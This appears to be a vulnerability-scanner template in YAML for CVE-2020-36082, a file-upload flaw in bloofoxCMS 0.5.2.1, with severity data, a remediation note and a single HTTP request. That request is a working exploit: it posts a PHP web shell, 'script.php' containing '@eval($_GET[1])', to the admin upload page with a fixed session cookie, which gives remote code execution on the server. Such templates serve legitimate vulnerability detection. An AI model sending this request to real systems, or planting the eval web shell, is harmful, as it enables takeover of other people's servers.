id: CVE-2020-36082

info:
  name: Arbitrary File Upload in bloofoxCMS 0.5.2.1
  author: ProjectDiscoveryAI
  severity: critical
  description: File Upload vulnerability in bloofoxCMS version 0.5.2.1 allows remote attackers to execute arbitrary code via crafted webshell file.
  impact: |
    Successful exploitation could lead to remote code execution and compromise of the affected system.
  remediation: |
    Upgrade bloofoxCMS to version 0.5.2.2 or later to mitigate the vulnerability.
  reference:
    - https://github.com/alexlang24/bloofoxCMS/issues/7
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-36082
    cwe-id: CWE-434
    epss-score: 0.0035
    epss-percentile: 0.72593
    cpe: cpe:2.3:a:bloofox:bloofoxcms:0.5.2.1:*:*:*:*:*:*:*
  metadata:
    vendor: bloofox
    product: bloofoxcms
    fofa-query: Powered by bloofoxCMS

http:
  - method: POST
    path:
      - "{{BaseURL}}/bloofoxCMS/admin/index.php?mode=tools&page=upload"

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------36808327791705981033859481452
      Cookie: sid=o89l00kuhepcn1h7ls87vfsqa1

    body: |
      -----------------------------36808327791705981033859481452
      Content-Disposition: form-data; name="dir"

      ../media/images/
      -----------------------------36808327791705981033859481452
      Content-Disposition: form-data; name="file1"; filename="script.php"
      Content-Type: application/octet-stream

      <?php @eval($_GET[1]);
      echo 'upload success';
      ?>

      -----------------------------36808327791705981033859481452
      Content-Disposition: form-data; name="file2"; filename=""
      Content-Type: application/octet-stream
      -----------------------------36808327791705981033859481452--
    matchers:
      - type: status
        status:
          - 200
